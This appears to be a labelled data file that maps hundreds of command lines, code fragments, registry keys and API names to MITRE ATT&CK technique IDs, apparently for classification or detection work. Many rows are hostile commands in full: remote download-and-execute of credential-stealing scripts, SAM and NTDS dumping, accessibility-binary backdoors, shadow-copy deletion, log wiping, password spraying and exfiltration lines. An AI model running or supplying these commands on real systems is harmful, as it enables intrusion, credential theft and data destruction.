netsh.exe,T1562
IntPtr hToken;,T1562
type C:\Windows\Panther\unattend.xml,T1552
date 010100001971,T1070
which_python=$(which python || which python3 || which python3.9 || which python2),T1059
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe,T1546
EnumSystemLocalesA,T1106
"enable=* log_password"" >> /etc/pam.d/system-auth",T1056
UseLogonCredential,T1112
Get-ProcessTokenGroup,T1087
"if (test-connection -count 1 -computername ""$ftp_server"" -quiet)",T1048
"reg add ""HKLM\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultDomainName /t REG_SZ /d contoso.com /f",T1562
schtasks,T1007
"wmic /node:""$target_host"" shadowcopy call create Volume=$drive_letter",T1003
Remove-Item,T1070
SIGHUP,T1564
New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null,T1005
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoControlPanel /t REG_DWORD /d 1 /f",T1112
which_ccencrypt=`which ccencrypt`,T1486
getinfo,T1124
Program Files,T1485
Dim applicationPath As String,T1137
dump64.exe,T1036
NtAllocateVirtualMemory,T1106
ReadDirectoryChangeW,T1106
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders,T1060
Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $pfx_path -Password $mypwd,T1552
"if ($awsAccessKey -eq """" -or $awsSecretKey -eq """") {",T1567
cat /dev/null > /var/log/messages #truncating the file to zero bytes,T1070
Name = $_.PSChildName,T1007
%TEMP%\<⁠random_9_alnum_chars>.batfile,T1059
whoami; ausearch -i --start now,T1056
"dir /s ""c:\Documents and Settings"" >> $output_file",T1083
"if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi",T1562
New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null,T1114
EhStorAuthn.exe,T1055
mmc.exe -Embedding C:\path\to\test.msc,T1218
"[DllImport(""advapi32.dll"", SetLastError = true)]",T1562
/systemd/system,T1543
sftp,T1105
HKCU\SOFTWARE\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\,T1552
ImagePath = $p.ImagePath,T1007
"@FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\$user"" ""%p"" 1>NUL 2>&1 && @echo [*] $user:%p && @net use /delete %logonserver%\IPC$ > NUL",T1110
G$RADIUSCHAPKEY,T1556
Foreach ($item in $input_table){,T1546
WNetAddConnection2W,T1106
sdir,T1083
Add-Type -AssemblyName System.Windows.Forms,T1113
GoogleTranslate.crx,T1036
} while (-not $result.EndOfMessage),T1539
"Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",T1053
"Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1555\src\T1555-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""",T1555
"Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""",T1059
", or",T1564
"cmd /c ""$nircmd_location"" $command_to_execute",T1564
certutil.exe,T1105
sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin,T1078
kubectl create -f src/cronjob.yaml -n $namespace,T1053
Remove-Item $profile\key4.db > $null,T1555
New-Item -ItemType Directory -Path $storageAccountOutputPath,T1530
wsmprovhost.exe,T1574
"invoke-expression 'cmd /c start powershell -command { cmd /c ""$snaffler_path"" -a -o ""$output_path"" }; start-sleep 90; stop-process -name ""snaffler""'",T1135
git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git,T1110
SafeMode,T1136
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets,T1003
msacm32.dll,T1036
$decryptedString | Out-File $env:temp\T1027.013_decryptedEicar.txt,T1027
"Start-Process ""$NetSupport_Path"" -ArgumentList ""/S /v/qn""",T1219
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"" /ve /T REG_SZ /d ""AtomicTest"" /f",T1546
"reg.exe import ""$registry_file""",T1546
LineDDA,T1106
echo Spring2022>> passwords.txt,T1110
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self],T1547
aws logs delete-log-stream --log-group-name $cloudwatch_log_group_name --log-stream-name $cloudwatch_log_stream_name --region $region,T1562
GetBucketAcl,T1069
reg,T1003
"New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER"" -PropertyType String -Value ""$clsid_guid"" -Force | Out-Null",T1574
STOMP,T1071
HttpOpenRequestA,T1106
"""$vboxmanage_exe"" createvm --name ""$vm_name"" --register",T1564
zip $output_file $input_files,T1560
"if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq ""6"" ];",T1562
Remove-Item -Path $folder_to_delete -Recurse,T1070
C:\windows\temp\tmp0207,T1070
Get-LocAdm,T1069
"if ($role -eq $null) { Write-Warning ""Role not found""; exit }",T1098
C:\Windows\System32\cmd.exe /c nltest /domain_trusts,T1482
NetShareEnum,T1135
sharing -l,T1135
"[Reflection.Assembly]::LoadFile(\""%s\"")\n$i=\""\""\n$r=[%s]::%s(\""%s\"",[ref] $i)\necho $r,$i\n",T1059
"New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""$command"" -PropertyType ""String""",T1546
pfctl -a pf-rules -s rules,T1562
/Q /c wevtutil cl security,T1070
Write-Host $cookies,T1539
system hostname get,T1082
xp_cmdshell,T1059
Performance,T1574
"Write-Host ""Failed to start the process. Error code: $($Result.ReturnValue)""",T1546
$APPDATA%\Thunderbird\Profiles\,T1552
launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist,T1543
Scriptrunner.exe -appvscript {PATH:.exe},T1202
"Copy-Item ""$exe_file_path"" -Destination ""C:\Users\$env:UserName"" -Force",T1562
/proc,T1003
.jam,T1127
/date/.bd.key/preload.so,T1027
"mavinject.exe $process_id /INJECTRUNNING ""$dll_payload""",T1218
C:\ProgramData\Local Settings\Temp\mskmde.com,T1547
/etc/systemd/system/,T1053
MicrosoftCrashHandlerUAC,T1053
Get-EventLog security -instanceid 4624,T1033
AppInit_DLLs,T1546
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost,T1547
sftp.exe $username@$remote_host:$remote_path $local_path,T1105
regedit {PATH_ABSOLUTE}:regfile.reg,T1564
readlink,T1562
"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""",T1202
"sc create Windowscarpstss binpath= ""cmd.exe /c cscript.exe c:\\windows\\system32\\w7_1.wsf humpback_whale"" start= ""auto"" obj= ""LocalSystem""",T1543
pr_set_name,T1036
"echo ""#!/bin/bash"" > /etc/init.d/T1543.002",T1543
lsl,T1083
reg save HKLM\sam sam,T1003
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins\$Subkey_Added"" /v Name /t REG_SZ /d ""$dll_inf"" /f",T1547
"devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} ""{CMD:args}"" test",T1127
webhook.site,T1567
takeown /F %windir%\System32\osk.exe /A,T1546
Get-TimedScreenshot,T1113
shutdown /s /t $timeout,T1529
REAgentC.exe,T1490
timeIntervalSinceNow,T1124
"Write-Host ""User $($user.DisplayName) was added to $($role.DisplayName) role""",T1098
sc.exe config $service_name start= disabled,T1562
RegisterClassW,T1106
C:\program.exe,T1574
cp $root_input_file_path $cped_file_path;,T1486
"Scriptrunner.exe -appvscript ""$payload_path""",T1202
-safeboot-instance -pass,T1547
Remove-Item -path $file_to_delete,T1070
$logs | ForEach-Object {Clear-EventLog -LogName $_ },T1070
$newCred.Password | ConvertFrom-SecureString | Out-File $credFile,T1098
"sc config W64Time DisplayName= ""Windows 64 Time""",T1543
kldstat | grep vmm,T1082
net time \\hostname,T1124
%STARTUP%,T1547
mount –B,T1564
"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi",T1497
HKCU:\Software\Netwire,T1027
"$(dirname ""$(pwd -P)"")",T1083
pktmon.exe start --etw -f %TEMP%\t1040.etl,T1040
winget.exe install --manifest {PATH:.yml},T1105
"&""$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"" -LogPath $filepath",T1056
csc.exe -out:{PATH:.exe} {PATH:.cs},T1127
/home/runtime/logs,T1070
echo $ENCODED > $encoded_file && xxd -r -p $encoded_file,T1140
"echo ""https://akira.onion"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
/var/run,T1027
March 25 rcs.docx,T1036
/Library/Preferences/com.apple.loginwindow.plist,T1037
cacls.exe,T1222
TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000,T1048
"echo ""RDP connection established""",T1021
$env:COR_ENABLE_PROFILING = 1,T1574
echo Requesting SYSVOL:,T1558
dscl . -passwd /Users/AtomicUser mySecretPassword,T1078
C:\windows\temp\,T1074
touch -r <filename> <filename>,T1070
"Get-ChildItem -Path ""$UserDir""",T1546
/domain,T1087
security find-generic-password -wa wifiname,T1016
/success,T1562
New-Item -ItemType Directory -Path $Copy | Out-Null,T1560
GetNetworkParams,T1106
HKLM\SOFTWARE\Plus,T1027
‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’,T1112
coregen.exe /L {PATH_ABSOLUTE:.dll} dummy_assembly_name,T1055
certctl rehash,T1553
rasautou -d {PATH:.dll} -p export_name -a a -e e,T1218
HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run vpdn “%ALLUSERPROFILE%\%APPDATA%\vpdn\VPDN_LU.exe”,T1547
generaldomaininfo -noninteractive -consoleoutput,T1087
.xcassets,T1564
auditctl -e 0,T1562
"mkdir ""\\?\C:\Windows \System32\""",T1548
dlsym(),T1129
DeleteFileA,T1070
cp $HISTFILE $HISTFILE.OLD,T1562
HKCR\http\shell\open\command,T1012
file /bin/pwd,T1083
"rundll32.exe {PATH_SMB:.dll},EntryPoint",T1218
"Write-Host ""Waiting 10s before putting $processName in the comma"" -ForegroundColor Yellow",T1562
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'),T1003
wget,T1105
touch $target_filename,T1070
OpenEventLog/ClearEventLog APIs,T1070
ls -la /tmp/art.txt,T1059
CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.,T1218
explorer.exe {PATH_ABSOLUTE:.exe},T1202
dotnet.exe fsi,T1059
"$ShortCut.Description = ""T1547.009."";",T1547
Start-Process $MSP360_Connect_Path,T1219
"Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""$ms_product"" -sub ""Scheduler""",T1053
"New-Item -ItemType Key -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""",T1547
chown root $file_to_setuid,T1548
fsi.exe {PATH:.fsscript},T1059
C:\Users\Public\Documents\Flash\,T1564
Xxsh,T1059
echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0,T1078
"New-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name DefaultDomainName -Value contoso.com -Force",T1562
"find $file_path/.azure -name ""msal_token_cache.json"" -o -name ""accessTokens.json"" -type f 2>/dev/null",T1552
"Write-Host ""32-bit Office""",T1137
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareWks /t REG_DWORD /d 0 /f",T1070
"net user ""$username"" ""$password"" /add /domain",T1136
PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder},T1564
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" /v ""DisallowExploitProtectionOverride"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
$which_python $python_binary_name,T1059
"get-process | ?{$_.Description -like ""*defender*""}",T1518
{if($_.Exception.Response -ne $null),T1619
dd of=$file_to_overwrite if=$overwrite_source count=$(ls -l $file_to_overwrite | awk '{print $5}') iflag=count_bytes,T1485
"$resourceAccess.Type = ""Role""",T1098
powershellsensitive -consoleoutput -noninteractive,T1552
user locale of (get system info),T1614
/data2/.bd.key/authd,T1574
Microsoft.NodejsTools.PressAnyKey.exe normal 1 {PATH:.exe},T1127
shutdown /r /t $timeout,T1529
ldapdomaindump -u $username -p $password $target_ip -o /tmp/T1087,T1087
New-Item -Path $SilentProcessExit -Force,T1546
ZwLoadDriver(),T1543
sudo kextload $module_path,T1547
Get-GPPPassword -Verbose,T1552
Wow64SetThreadContext,T1106
"Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test"" ""(Default)"" ""ART TEST"" -Force",T1547
"Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll",T1547
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore,T1558
echo $ENCODED > $encoded_file && base64 -d $encoded_file,T1140
"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('$url');$Xml.command.a.execute | IEX""",T1059
"HKEY_CURRENT_USER \Software\Microsoft\Windows\CurrentVersion\Run\”vert” = “rundll32.exe c:\windows\temp\pvcu.dll , Qszdez”",T1218
"Copy-Item ""$PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll"" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll",T1547
echo $ENCODED > $encoded_file && cat $encoded_file | xxd -r -p,T1140
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337,T1539
esxcli software vib install --force,T1505
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),T1548
touch /var/tmp/T1564.001_mac.txt,T1564
xattr -p,T1564
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load,T1012
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMPIN /t REG_DWORD /d 2 /f",T1112
shred -u $file_to_shred,T1070
KERBEROS::PTT,T1550
"echo ""e"" > /proc/sysrq-trigger",T1489
RtlCreateUserThread,T1055
screencapture,T1113
Get-WmiObject win32_bios,T1082
if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null },T1562
argv[0],T1036
"Write-Output ""Found blob: $($blob)""",T1619
$decodedString | Out-File $env:temp\T1027.013_decodedEicar.txt,T1027
Get-WMIObject Win32_Group,T1069
systeminfo.exe,T1082
Mega.co.nz,T1567
LC_LOAD_WEAK_DYLIB,T1574
Muraena,T1539
"sudo lsmod | grep -i ""vboxsf\|vboxguest""",T1082
ldd,T1574
HKCU\Software\ApplicationContainer\Appsw64,T1112
"taskName = ""OpenCalcTask""",T1137
reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”,T1547
echo $bash_encoded | base64 -d | bash,T1140
ImpersonateNamedPipeClient,T1134
user1 ALL=(ALL) NOPASSWD: ALL,T1548
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,",T1218
cd $working_dir,T1105
LoadAppInit_DLLs,T1546
Put,T1105
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}",T1218
officeupdate.exe,T1053
$which_python $python_script_name,T1059
OfflineScannerShell,T1218
"New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force",T1112
"Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads\Edge"" -Force -Recurse",T1555
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot,T1027
unset HISTIGNORE,T1562
start-sleep -s 15,T1218
"$web_client.UploadFile($uri, $file.FullName)}}",T1048
systemctl,T1562
Get-NetIPAddress,T1016
NT AUTHORITY\SYSTEM,T1134
"SystemParametersInfo(20,0,thePath,3);",T1491
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f",T1112
pyminifier,T1027
al-khaser,T1497
net accounts (/domain),T1201
vssadmin.exe list shadows,T1082
winmail.dat,T1036
openssl,T1140
New-PSSession -ComputerName $hostname_to_connect,T1059
ntdsutil.exe,T1003
/.local/share/keyrings,T1555
"if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;",T1007
Remove-CimSession -CimSession $CimSession,T1546
"reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri "".*\.sys$""",T1012
dllhost.exe,T1546
ps aux | egrep 'Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu',T1518
"systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'",T1053
"$sheet.Cells.Item(21,1) = ""=WAIT(NOW()+`""00:00:05`"")""",T1204
UILanguage = Get-WinUILanguageOverride,T1614
AVCaptureStillImage,T1113
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup,T1547
"C:\Windows\System32\cmd.exe /c net group ""Domain Admins"" /domain",T1087
ImpersonateLoggedOnUser,T1134
WinHttpGetIEProxyConfigForCurrentUser(),T1090
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore,T1222
.report,T1497
GetIpAddrTable,T1016
install.log,T1562
"$tr.Add(""[AccessDenied] $root"")",T1083
.basta,T1486
%APPDATA%\OneDrive.bat,T1059
"Start-Process ""$dirlister_path""",T1083
setres.exe -w 800 -h 600,T1218
"msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=""{REMOTEURL:.mst}"" /qb",T1218
"echo ""[*] Listing SysV init scripts (/etc/init.d):""",T1007
taskkill -f -im win32calc.exe,T1218
wallpaper.mp4,T1036
cp ${FILE} /tmp/t1547007_loginwindow-backup.plist,T1547
atbroker /start malware_test,T1546
$tcp.Close(),T1046
"sudo sed -i """" ""$indexs,^,$pam_rule\n,g"" $path_to_pam_conf",T1556
"Copy-Item -Path $termsrvDll -Destination ""$HOME\AtomicTest.dll""",T1505
procdump,T1003
takeown /F C:\Windows\System32\Magnify.exe /A,T1546
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyServer /t REG_SZ /d ""proxy.atomic-test.com:8080"" /f",T1112
GetlogicalDrives,T1680
"ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);",T1562
findmnt -t nfs,T1083
HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,T1547
mpnotify.exe,T1556
exe,T1574
%temp%\Downloads,T1074
"ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c ""{CMD}"" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe",T1548
HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU,T1547
"""$file_name""",T1562
"if ($value -eq ""1"")",T1137
get-aduser -filter *,T1087
"Start-Process ""$nsudo_path"" -Argument ""-U:T -P:E cmd""",T1134
GetComputerName,T1082
tracert -h 5 -4 google.com,T1016
if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > $output_file; fi;,T1087
"foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}",T1018
"if (Test-Path ""C:\Users\Default\AppData\Local\Temp\hello.log"") { Remove-Item ""C:\Users\Default\AppData\Local\Temp\hello.log"" -Force; Write-Host ""[+] hello.log removed."" }",T1027
"""$uacme_exe""",T1548
"rundll32.exe zipfldr.dll,RouteTheCall ""$exe_to_launch""",T1218
VirtualAlloc,T1106
contentsOfDirectoryAtPath,T1106
HKCU\Software\Microsoft\Office\,T1112
"$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")""",T1204
%WINDIR%\SYSTEM32\oci.dll,T1574
WantedBy=multi-user.target,T1543
fsutil behavior set SymlinkEvaluation R2L:1,T1222
/etc,T1546
AllowReversiblePasswordEncryption,T1556
cat $output_file,T1003
"Rundll32.exe apphelp.dll,ShimFlushCache",T1112
"if (-not (Test-Path -Path""$env:TEMP\t1003.001-13-rdrleakdiag"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force}",T1003
api_paste_code = $content,T1567
%appdata%\Roaming\Microsoft\Templates\,T1053
systemctl disable,T1569
powershell.exe -ep bypass -ec IgBXAGUAIAA8ADMAIABMAE8ATABCAEEAUwAiAA==,T1059
tcpdump -c 5 -nnni $interface,T1040
COR_ENABLE_PROFILING,T1574
ucmDccwCOMMethod,T1548
"Write-Output ""Shared key access is disabled for this storage account.""",T1528
"ntdsutil ""ac i ntds"" ""ifm"" ""create full $output_folder"" q q",T1003
"Send-MailMessage -From $sender -To $receiver -Subject ""T1048.003 Atomic Test"" -Attachments $input_file -SmtpServer $smtp_server",T1048
/usr/lib/udev/rules.d/,T1546
CreateDesktop(),T1564
"Set-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""(default)"" -Value ""$executable_binary"" -Force",T1548
pwd.py,T1083
.\kerbrute.exe bruteuser --dc $domaincontroller -d $domain $env:temp\bruteuser.txt TestUser1,T1110
"if ($subscription -eq $null) { Write-Warning ""Subscription not found""; exit }",T1098
echo 3> /proc/sys/vm/drop_caches,T1562
uploaddd,T1005
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force,T1555
Remove-SmbShare -Name $share_name,T1070
"cd ""$rsp_file_path""",T1218
svehost.exe,T1036
HelpAssistant,T1036
bash_history,T1552
/bin/authd,T1574
RequireSigned,T1553
grepWinNP3.exe,T1574
"set-itemproperty $RunOnceKey ""NextRun"" '$thing_to_execute ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'",T1547
findstr /S /I cpassword \\sysvol\policies\*.xml,T1552
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""",T1547
Dim schTasksCmd As String,T1137
Get-RegistryAutoLogon,T1552
HKCU\Software\dnimtsoleht\StubPath,T1547
OpenService,T1543
"New-NetFirewallRule -DisplayName ""New rule"" -Direction ""$direction"" -LocalPort ""$local_port"" -Protocol ""$protocol"" -Action ""$action""",T1562
$requiredResourcesAccess.Add($requiredGraphAccess),T1098
service art-test start,T1543
FileShareName = $fileShare,T1619
ls.py,T1083
public const uint TOKEN_QUERY = 0x0008;,T1562
curl -O $remote_url/gta.db,T1005
"echo ""Atomic Red Team TEST"" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM",T1137
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,T1547
/etc/emond.d/rules/,T1546
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:$output_file ""$input_file""",T1027
reg save HKLM\sam %temp%\sam,T1003
foreach ($row in $storage_account_objects) {,T1530
"Copy-Item -Path ""C:\Windows\System32\termsrv.dll"" -Destination ""C:\Windows\System32\termsrv_backup.dll"" -ErrorAction Ignore",T1505
hidcon,T1564
"rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}",T1218
su -c whoami art,T1078
/proc/*/environ,T1083
Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=$uac_prop)' -Server $domain,T1087
IVssBackupComponents,T1490
IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ),T1546
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist,T1562
SetLastError,T1106
echo 'source = session.get(url).content' >> $python_script_name,T1059
sigverif.exe,T1218
rm ~/.bash_history,T1070
WScript.Sleep,T1497
connect-mggraph -AccessToken $token,T1114
"if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;",T1016
"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1""",T1003
env | grep LANG,T1614
xsd.exe {REMOTEURL},T1105
C:\Program Files\Common Files\System\Ole DB\,T1074
touch -acmr $reference_file_path $target_file_path,T1070
OutputAssemblyFileName = $InstallerAssemblyFileName,T1218
echo $ENCODED > $encoded_file && cat $encoded_file | b64decode -r,T1140
PR_DELETE_AFTER_SUBMIT,T1070
"for /F ""tokens=1,2"" %i in ('qwinsta /server:$computer_name ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt",T1033
"""$rar_exe"" a -hp""blue"" hello.rar",T1560
"[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null",T1110
Aqua,T1543
fsi.exe,T1059
"$which_python -c ""import pty;pty.spawn('/bin/bash')""",T1059
iptables-save > /tmp/iptables.rules,T1562
pslist,T1057
for ($var = 1; $var -le $lockout_threshold; $var++) {,T1110
IsDebuggerPresent,T1622
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},T1490
HH.exe {REMOTEURL:.bat},T1105
"Stop-Process -Name ""WinWord""",T1137
rc.common,T1037
Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile $extract_path\SYSTEM_HIVE,T1003
powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe},T1216
key4.db,T1552
"python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())""",T1140
"HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe",T1547
"REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v $user_name$ /t REG_DWORD /d 0",T1564
&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml,T1484
netstat -anop tcp,T1049
stari.txt,T1074
"echo ""$script_command"" > $script_path",T1037
$which_7z a -p$pwd_for_encrypted_file $encrypted_file_path $input_file_path,T1486
"Write-Host ""Creating registry keys in HKCU:Software\Classes\CLSID\$clsid_guid"" -ForegroundColor Cyan",T1574
findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe,T1564
nslookup myip.opendns.comresolver1.opendns.com\r\n,T1016
bginfo.exe {PATH:.bgi} /popup /nolicprompt,T1218
if (!$Computer) { Continue },T1018
cp $calc_plist_path ~/Library/Preferences/ByHost/com.apple.loginwindow.plist,T1547
"odbcconf.exe -f ""$rsp_file_name""",T1218
"Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Authentication Packages"" $AuthenticationPackagesValues",T1556
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force",T1484
sudo /Library/StartupItems/atomic.sh start,T1037
ComputerDefaults.exe,T1548
net,T1087
if (Test-Path $extractFolder) {,T1562
"rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}",T1218
SysListView32,T1055
cliconfig.exe,T1548
$completeMessage.Append($receivedString),T1539
Start-Process -Wait $file1 /S;,T1219
NSFileManager,T1083
HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier},T1547
"wmic process get Capture, ExecutablePath",T1057
public static void SetWallpaper(string thePath){,T1491
reg query hklm\software\,T1012
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id },T1003
"Write-Host ""Registry key created: $registryPath""",T1562
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null,T1137
"cmd /c '$sharp_path' /ldap:all | out-file -filepath ""$output_path""",T1135
init,T1036
chflags nosimmutable $file_to_modify,T1222
dir d:\ >> %temp%\download,T1083
"Get-Item -Path ""HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad""",T1012
net stop,T1489
authd,T1055
BootExecute,T1547
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /t REG_DWORD /d 1 /f",T1112
